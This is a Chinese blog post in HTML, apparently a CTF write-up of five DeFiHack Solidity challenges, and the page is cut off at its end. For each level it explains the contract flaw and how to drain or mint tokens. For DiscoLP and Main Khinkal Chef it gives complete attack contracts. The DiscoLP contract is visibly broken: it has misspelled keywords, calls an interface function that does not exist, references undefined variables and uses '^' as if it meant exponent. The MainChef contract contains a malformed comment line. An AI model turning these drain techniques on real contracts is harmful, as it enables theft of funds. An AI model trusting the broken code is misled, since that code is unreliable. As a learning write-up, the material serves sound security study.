@@ -1,0 +1,194 @@
+<!DOCTYPE html><html lang="zh-Cn" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>CTF-DeFi Hack | 何方圜的博客</title><meta name="author" content="何方圜"><meta name="copyright" content="何方圜"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="DeFi Hack由于这个是一个题目集，就写在一起，做个写题记录五个题目的源代码，都在这里了：源代码：点击 May The Force Be With You题目要求是：要取得合约中所有的代币 首先还是看代码，合约代码，还是简单，重点还是看向withdrew函数，要撤回合约中的所有代币， function withdraw(uint256 numberOfShares) external nonR">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF-DeFi Hack">
+<meta property="og:url" content="http://example.com/2024/11/04/CTF-DeFi-Hack/index.html">
+<meta property="og:site_name" content="何方圜的博客">
+<meta property="og:description" content="DeFi Hack由于这个是一个题目集，就写在一起，做个写题记录五个题目的源代码，都在这里了：源代码：点击 May The Force Be With You题目要求是：要取得合约中所有的代币 首先还是看代码，合约代码，还是简单，重点还是看向withdrew函数，要撤回合约中的所有代币， function withdraw(uint256 numberOfShares) external nonR">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/1219ec3412a4cedf9378f9c0b14545e1.jpg">
+<meta property="article:published_time" content="2024-11-04T13:20:43.000Z">
+<meta property="article:modified_time" content="2024-11-05T12:48:02.615Z">
+<meta property="article:author" content="何方圜">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/1219ec3412a4cedf9378f9c0b14545e1.jpg"><link rel="shortcut icon" href="/img/1219ec3412a4cedf9378f9c0b14545e1.jpg"><link rel="canonical" href="http://example.com/2024/11/04/CTF-DeFi-Hack/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Error',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'CTF-DeFi Hack',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-11-05 20:48:02'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/background.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/1219ec3412a4cedf9378f9c0b14545e1.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">65</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><hr class="custom-hr"/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/8a5725b44b17e750ba6ce84aaca3013d.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="何方圜的博客"><span class="site-name">何方圜的博客</span></a></span><div id="menus"><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">CTF-DeFi Hack</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-11-04T13:20:43.000Z" title="Created 2024-11-04 21:20:43">2024-11-04</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-11-05T12:48:02.615Z" title="Updated 2024-11-05 20:48:02">2024-11-05</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="CTF-DeFi Hack"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="DeFi-Hack"><a href="#DeFi-Hack" class="headerlink" title="DeFi Hack"></a>DeFi Hack</h1><p>由于这个是一个题目集，就写在一起，做个写题记录<br>五个题目的源代码，都在这里了：<br>源代码：<a target="_blank" rel="noopener" href="https://www.defihack.xyz/level/0xB761C26d6Ade3Da1c6a4313C785b76B90cae702e">点击</a></p>
+<h2 id="May-The-Force-Be-With-You"><a href="#May-The-Force-Be-With-You" class="headerlink" title="May The Force Be With You"></a>May The Force Be With You</h2><p>题目要求是：要取得合约中所有的代币</p>
+<p>首先还是看代码，合约代码，还是简单，重点还是看向withdrew函数，要撤回合约中的所有代币，</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function withdraw(uint256 numberOfShares) external nonReentrant &#123;</span><br><span class="line">       // Gets the amount of xYODA in existence</span><br><span class="line">       uint256 totalShares = totalSupply();</span><br><span class="line">       // Calculates the amount of YODA the xYODA is worth</span><br><span class="line">       uint256 what =</span><br><span class="line">           numberOfShares.mul(yoda.balanceOf(address(this))).div(totalShares);</span><br><span class="line">       _burn(msg.sender, numberOfShares);</span><br><span class="line">       yoda.transfer(msg.sender, what);</span><br><span class="line"></span><br><span class="line">       emit Withdraw(msg.sender, what);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<p>有个tranfer函数，</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function transfer(address _to, uint256 _amount) public returns (bool success) &#123;</span><br><span class="line">       return doTransfer(msg.sender, _to, _amount);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<p>又是一个doTransfer函数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function doTransfer(address _from, address _to, uint _amount) internal returns(bool) &#123;</span><br><span class="line">       if (_amount == 0) &#123;</span><br><span class="line">           return true;</span><br><span class="line">       &#125;</span><br><span class="line">       // Do not allow transfer to 0x0 or the token contract itself</span><br><span class="line">       require((_to != address(0)) &amp;&amp; (_to != address(this)));</span><br><span class="line">       // If the amount being transfered is more than the balance of the</span><br><span class="line">       //  account the transfer returns false</span><br><span class="line">       if (balances[_from] &lt; _amount) &#123;</span><br><span class="line">           return false;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       // First update the balance array with the new value for the address</span><br><span class="line">       //  sending the tokens</span><br><span class="line">       balances[_from] = balances[_from] - _amount;</span><br><span class="line">       // Then update the balance array with the new value for the address</span><br><span class="line">       //  receiving the tokens</span><br><span class="line"></span><br><span class="line">       require(balances[_to] + _amount &gt;= balances[_to]); // Check for overflow</span><br><span class="line">       balances[_to] = balances[_to] + _amount;</span><br><span class="line">       // An event to make the transfer easy to find on the blockchain</span><br><span class="line">       Transfer(_from, _to, _amount);</span><br><span class="line">       return true;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<p>一路看下来，我并没有看见什么地方漏洞，那么又去看看<code>deposit</code>的函数，能不能免费给我们<code>mint</code>代币，果然发现了蹊跷，<code>deposit</code>函数中也存在<code>dotransfer</code>函数，而且它和<code>transferfrom</code>函数的表达上还有些歧义，如果<code>dotransfer</code>函数中，由于<code>aomunt</code>值太大，会导致<code>deposit</code>函数中的<code>transferFrom</code>函数直接返回<code>flase</code>,那么就意味着我们给合约转账失败，换句话来说就是我们可以免费获得x代币，然后再调用withdrew函数，就能获得大量的代币，把合约掏空。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (balances[_from] &lt; _amount) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<p>攻击思路；首先调用deposit函数，存入数量很大的amount，让合约给我们免费mint x代币。然后再调用withdrew函数，就能获得合约中的所有代币了。</p>
+<p>总的来说这个题，就是要要看好使用的哪些函数，而且他们的返回值都是bool类型的，然后再继续的找漏洞，理清合约的逻辑,敢于想象</p>
+<h2 id="DiscoLP"><a href="#DiscoLP" class="headerlink" title="DiscoLP"></a>DiscoLP</h2><p>题目要求是：<br>DiscoLP 是一个全新的流动性挖矿协议！您可以通过存入一些 JIMBO 或 JAMBO 代币来参与。所有流动性将提供给 JIMBO-JAMBO Uniswap 对。通过向我们提供流动性，您将获得 DISCO 代币作为回报！</p>
+<p>您有 1 个 JIMBO 和 1 个 JAMBO，您能获得至少 100 个 DISCO 代币吗？</p>
+<p>看向合约代码，只有一个主函数，depositToken,检查它有没有token的计算错误，<br>发现都是正常的，但是漏了一点</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _joinPool(address _pair, address _token, uint256 _amount, uint256 _minShares) internal returns (uint256 _shares)</span><br><span class="line"> &#123;</span><br><span class="line">   if (_amount == 0) return 0;</span><br><span class="line">   address _router = $.UniswapV2_ROUTER02;</span><br><span class="line">   address _token0 = Pair(_pair).token0();</span><br><span class="line">   address _token1 = Pair(_pair).token1();</span><br><span class="line">   address _otherToken = _token == _token0 ? _token1 : _token0;</span><br><span class="line">   (uint256 _reserve0, uint256 _reserve1,) = Pair(_pair).getReserves();</span><br><span class="line">   uint256 _swapAmount = _calcSwapOutputFromInput(_token == _token0 ? _reserve0 : _reserve1, _amount);</span><br><span class="line">   if (_swapAmount == 0) _swapAmount = _amount / 2;</span><br><span class="line">   uint256 _leftAmount = _amount.sub(_swapAmount);</span><br><span class="line">   _approveFunds(_token, _router, _amount);</span><br><span class="line">   address[] memory _path = new address[](2);</span><br><span class="line">   _path[0] = _token;</span><br><span class="line">   _path[1] = _otherToken;</span><br><span class="line">   uint256 _otherAmount = Router02(_router).swapExactTokensForTokens(_swapAmount, 1, _path, address(this), uint256(-1))[1];</span><br><span class="line">   _approveFunds(_otherToken, _router, _otherAmount);</span><br><span class="line">   (,,_shares) = Router02(_router).addLiquidity(_token, _otherToken, _leftAmount, _otherAmount, 1, 1, address(this), uint256(-1));</span><br><span class="line">   require(_shares &gt;= _minShares, &quot;high slippage&quot;);</span><br><span class="line">   return _shares;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+<p>在主函数中，调用_joinPool函数时，没有对token的来源进行检查，也就是说，只要pair对随意俩个token，就能mint DISCO<br>我们可以自己创造一个pair,然后赋值大量的token，给原本的流动性池提供该token。这样就能获得奖励的lp币</p>
+<p>Uniswap 的设计方式是必须以相同比例存入一对代币，但此功能允许质押单个代币，将价值的一半换成第二个代币。作为回报，授予了 LP 股票。</p>
+<p> depositToken函数不仅限于 JIMBO 或 JAMBO 令牌，而是实际上接受任何令牌，没有对参数进行验证。这意味着几乎可以质押任何代币，从而可以凭空铸造 DISCO。虽然原因很简单，但攻击执行需要多个步骤。</p>
+<p>攻击合约：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//SPDX-License-Identifier:MIT </span><br><span class="line">pragma solidity^0.8.13;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line">interface UniswapV2Factory&#123;</span><br><span class="line">    function createpair(address token0,address token1) externals return (address pair);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface UniswapV2Router &#123;</span><br><span class="line">   function addLiquidity(address _tokenA, address _tokenB, uint256 _amountADesired, uint256 _amountBDesired, uint256 _amountAMin, uint256 _amountBMin, address _to, uint256 _deadline) external returns (uint256 _amountA, uint256 _amountB, uint256 _liquidity);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface Discolp&#123;</span><br><span class="line">    function depositToken(address _token,uint256 _amount,uint256 _minShares) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Token is ERC20 &#123;</span><br><span class="line">    constructor(string memory _name, string memory _symbol) ERC20(_name, _symbol) public &#123;</span><br><span class="line">        _mint(msg.sender, 2**256 - 1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Hack &#123;</span><br><span class="line">    UniswapV2Factory factory;</span><br><span class="line">    UniswapV2Router router;</span><br><span class="line">    Discolp discolp;</span><br><span class="line">    uint256 balance;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    constructor (address _factory,address _router,address _discolp)&#123;</span><br><span class="line">        factory = UniswapV2Factory (_factory);</span><br><span class="line">        router = UniswapV2Router (_router);</span><br><span class="line">        discolp = Discolp (_discolp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pwn() exteranl&#123;</span><br><span class="line">    Token usdc =new Token(&quot;USDC token&quot;,&quot;USDC&quot;);</span><br><span class="line">    usdc.approve(factory,2^256-1);</span><br><span class="line">    usdc.approve(router,2^256-1);</span><br><span class="line">    //创建tokenA(JIMBO代币)，保证后续swap操作得以通过</span><br><span class="line">    ERC20(tokenA).approve(router,2^256-1);</span><br><span class="line"></span><br><span class="line">    //创建JIMBO-usdc对</span><br><span class="line">    address pair = factory.create(address (usdc),address(tokenA));</span><br><span class="line"></span><br><span class="line">    //添加流动性</span><br><span class="line">      (uint256 amountA, uint256 amountB, uint256 _shares) = IUniswapV2Router(_router).addLiquidity(</span><br><span class="line">          address(usdc),</span><br><span class="line">          address(tokenA),</span><br><span class="line">          100000000000 * 10 ** 18, //增加流动性usdc的数量</span><br><span class="line">          1 * 10 ** 18,//增加流动性JIMBO数量</span><br><span class="line">          1, 1, </span><br><span class="line">          address(this),//接受lp的地址，合约本身。</span><br><span class="line">           2**256 - 1);</span><br><span class="line">        DiscoLP(instance).depositToken(address(evil), amount, 1);</span><br><span class="line"></span><br><span class="line">        uint256 balance = discolp.balanceOf(address(this));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这就是以上的攻击代码，总结以下，关于流动性的题，首先要看，token的计算，再看逻辑，然后一些检查条件，是否可以再次创建pair,进行套利。</p>
+<h2 id="P2PSwapper"><a href="#P2PSwapper" class="headerlink" title="P2PSwapper"></a>P2PSwapper</h2><p>题目要求：<br>P2PSwapper 是一款适用于任何资产的超级方便的零信任 P2P DEX！ 费用是固定的，所以欢迎鲸鱼！ 此外，我们还有一个推荐计划，所有费用都在我们和主要所有者之间平均分配。</p>
+<p>我们创建了一个样本交易并为此存入了一些资金。我们希望确保您无法提取分配给我们交易的费用。</p>
+<p>您必须从 P2PSwapper 的余额中耗尽所有 WETH 代币。</p>
+<p>看向主要的P2P_WETH合约，其实漏洞就遇到过几次了，<br>这是库合约中的函数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function safeTransferFrom(</span><br><span class="line">        address token,</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint256 value</span><br><span class="line">    ) internal &#123;</span><br><span class="line">        // bytes4(keccak256(bytes(&#x27;transferFrom(address,address,uint256)&#x27;)));</span><br><span class="line">        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));</span><br><span class="line">        require(</span><br><span class="line">            success &amp;&amp; (data.length == 0 || abi.decode(data, (bool))),</span><br><span class="line">            &#x27;TransferHelper::transferFrom: transferFrom failed&#x27;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function safeTransfer(</span><br><span class="line">       address token,</span><br><span class="line">       address to,</span><br><span class="line">       uint256 value</span><br><span class="line">   ) internal &#123;</span><br><span class="line">       // bytes4(keccak256(bytes(&#x27;transfer(address,uint256)&#x27;)));</span><br><span class="line">       (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0xa9059cbb, to, value));</span><br><span class="line">       require(</span><br><span class="line">           success &amp;&amp; (data.length == 0 || abi.decode(data, (bool))),</span><br><span class="line">           &#x27;TransferHelper::safeTransfer: transfer failed&#x27;</span><br><span class="line">       );</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<p>和之前的一样，就是外部调用，没有进行对token地址的检查，所以可以自己编写一个攻击合约，就是一个token合约,可以进行攻击</p>
+<h2 id="FakerDAO"><a href="#FakerDAO" class="headerlink" title="FakerDAO"></a>FakerDAO</h2><p>由于已经关网了，这个题要合约实例才能写，个人理解</p>
+<h2 id="Main-Khinkal-Chef"><a href="#Main-Khinkal-Chef" class="headerlink" title="Main Khinkal Chef"></a>Main Khinkal Chef</h2><p>题目要求，还是要消耗合约中所有代币</p>
+<p>这个合约，就是前期有点难看懂，其实就是实现了一个流动性池的的奖励机制</p>
+<p>漏洞就在于这个函数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Update governance address by the governance.</span><br><span class="line">  function setGovernance(</span><br><span class="line">      address _governance</span><br><span class="line">  ) public &#123;</span><br><span class="line">      require(msg.sender == owner() || msg.sender == _governance, &quot;Access denied&quot;);</span><br><span class="line">      governance = _governance;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>由于传递了参数，这个governance我们就可以改动，一旦成为了，管理员，那么我们就可以自己创建一个流动性池，然后利用自己合约是个代币合约，给原合约转入很多代币，以便后面消除它</p>
+<p>攻击合约</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//SPDX-Lincense-Identifier:MIT</span><br><span class="line">pragma solidity ^0.8.12;</span><br><span class="line"></span><br><span class="line">import &quot;../levels/MainChef.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract MainChefAttack &#123;</span><br><span class="line">    uint pwned;</span><br><span class="line">    uint tradeId;</span><br><span class="line">    MainChef target;</span><br><span class="line"></span><br><span class="line">    constructor(MainChef _target) public &#123;</span><br><span class="line">        target = _target;</span><br><span class="line">        pwned = 0;</span><br><span class="line">    &#125;</span><br><span class="line">//前期准备工作</span><br><span class="line">    function prepare() public &#123;</span><br><span class="line">        /先成为governance</span><br><span class="line">        target.setGovernance(address(this));</span><br><span class="line">        //将自己合约作为一个新的lp代币，添加到流动池中</span><br><span class="line">        target.addToken(IERC20(address(this)));</span><br><span class="line">        </span><br><span class="line">        target.deposit(1, 500010319375738048); // (31333333337 + 313337) / 2 * 1e12 / 31333</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function hack() public &#123;</span><br><span class="line">        target.withdraw(1);</span><br><span class="line">    &#125;</span><br><span class="line">    //为了满足原合约对lp代币的一些require，（也就是绕过某些条件）</span><br><span class="line">    function transferFrom(address sender, address recipient, uint256 amount) public virtual returns (bool) &#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address a) external returns (uint) &#123;</span><br><span class="line">        return 1e18;</span><br><span class="line">    &#125;</span><br><span class="line">//做一个检查，是否转账成功了</span><br><span class="line">    function transfer(address recipient, uint256 amount) public virtual returns (bool) &#123;</span><br><span class="line">      if(pwned != 0) return true;</span><br><span class="line">      pwned += 1;</span><br><span class="line">      target.withdraw(1);</span><br><span class="line">      return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>个人觉得就是没有注意逻辑性，可以随便更改governance,然后操控权控制在自己手中</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://example.com">何方圜</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://example.com/2024/11/04/CTF-DeFi-Hack/">http://example.com/2024/11/04/CTF-DeFi-Hack/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://https://HeYuan-33.github.io/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a></div><div class="post_share"><div class="social-share" data-image="/img/1219ec3412a4cedf9378f9c0b14545e1.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/11/03/Uwerx%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90/" title="Uwerx攻击事件分析"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next</div><div class="next_info">Uwerx攻击事件分析</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2024/10/27/CTF-Flash-Loaner/" title="CTF-Flash-Loaner"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-27</div><div class="title">CTF-Flash-Loaner</div></div></a></div><div><a href="/2024/10/14/CTF-Creativity/" title="CTF-Creativity"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-14</div><div class="title">CTF-Creativity</div></div></a></div><div><a href="/2024/10/28/CTF-Extractoor/" title="CTF-Extractoor"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-28</div><div class="title">CTF-Extractoor</div></div></a></div><div><a href="/2024/10/20/CTF-SafuVault/" title="CTF-SafuVault"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-20</div><div class="title">CTF-SafuVault</div></div></a></div><div><a href="/2024/10/28/CTF-Side-Entrance/" title="CTF-Side-Entrance"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-28</div><div class="title">CTF-Side-Entrance</div></div></a></div><div><a href="/2024/10/16/CTF-GasValue/" title="CTF-GasValue"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-16</div><div class="title">CTF-GasValue</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/1219ec3412a4cedf9378f9c0b14545e1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">何方圜</div><div class="author-info__description">夫孰异道而相安</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">65</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/HeYuan-33/HeYuan-33.github.io"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">CTF的更新</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#DeFi-Hack"><span class="toc-text">DeFi Hack</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#May-The-Force-Be-With-You"><span class="toc-text">May The Force Be With You</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DiscoLP"><span class="toc-text">DiscoLP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#P2PSwapper"><span class="toc-text">P2PSwapper</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FakerDAO"><span class="toc-text">FakerDAO</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Main-Khinkal-Chef"><span class="toc-text">Main Khinkal Chef</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/04/CTF-DeFi-Hack/" title="CTF-DeFi Hack">CTF-DeFi Hack</a><time datetime="2024-11-04T13:20:43.000Z" title="Created 2024-11-04 21:20:43">2024-11-04</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/03/Uwerx%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90/" title="Uwerx攻击事件分析">Uwerx攻击事件分析</a><time datetime="2024-11-03T08:06:19.000Z" title="Created 2024-11-03 16:06:19">2024-11-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/03/UniswapV3-V4-%E5%8A%9F%E8%83%BD%E5%AF%B9%E6%AF%94/" title="UniswapV3,V4 功能对比">UniswapV3,V4 功能对比</a><time datetime="2024-11-03T08:00:58.000Z" title="Created 2024-11-03 16:00:58">2024-11-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/11/02/git-%E5%8D%8F%E4%BD%9C%E6%B5%81%E7%A8%8B/" title="git 协作流程">git 协作流程</a><time datetime="2024-11-02T03:47:43.000Z" title="Created 2024-11-02 11:47:43">2024-11-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/10/30/CTF-degen-jackpot/" title="CTF-degen-jackpot">CTF-degen-jackpot</a><time datetime="2024-10-30T04:29:39.000Z" title="Created 2024-10-30 